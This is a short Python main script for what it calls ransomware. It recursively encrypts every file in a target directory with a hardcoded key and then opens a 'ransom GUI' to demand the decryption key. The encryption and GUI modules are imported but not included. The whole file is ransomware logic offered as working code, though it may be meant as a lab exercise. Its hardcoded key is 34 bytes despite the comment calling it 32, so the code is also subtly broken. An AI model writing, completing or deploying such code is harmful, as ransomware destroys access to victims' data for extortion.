import os
from encryption import encrypt_file
from gui import launch_gui

def main():
    # 32-byte key for AES-256
    key = b'my_secret_32_byte_key_for_aes256!!'
    
    # Directory to encrypt files from (change this path as needed)
    target_dir = "./test_files"
    
    # Collect all files in directory (excluding .enc files)
    files_to_encrypt = []
    for root, _, files in os.walk(target_dir):
        for file in files:
            if not file.endswith('.enc'):
                files_to_encrypt.append(os.path.join(root, file))
    
    # Encrypt all files
    for file_path in files_to_encrypt:
        encrypt_file(file_path, key)
    
    # Launch ransom GUI to prompt for decryption key
    launch_gui(files_to_encrypt, key)

if __name__ == "__main__":
    main()
